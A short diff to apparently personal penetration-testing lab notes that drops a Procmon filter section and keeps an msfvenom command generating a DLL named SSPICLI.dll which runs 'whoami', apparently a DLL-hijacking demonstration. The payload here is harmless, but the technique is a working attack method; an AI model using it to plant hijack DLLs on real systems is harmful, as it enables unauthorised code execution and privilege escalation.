@@ -1,9 +1,3 @@
-## Procmon
-### Filter
-    Process Name contains #Value
-    Path contains #value
-    Result is #value
-____________________________________________________________________________________________________________________
 ## Showcase
 ### Fake Payload
     msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\ssers\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
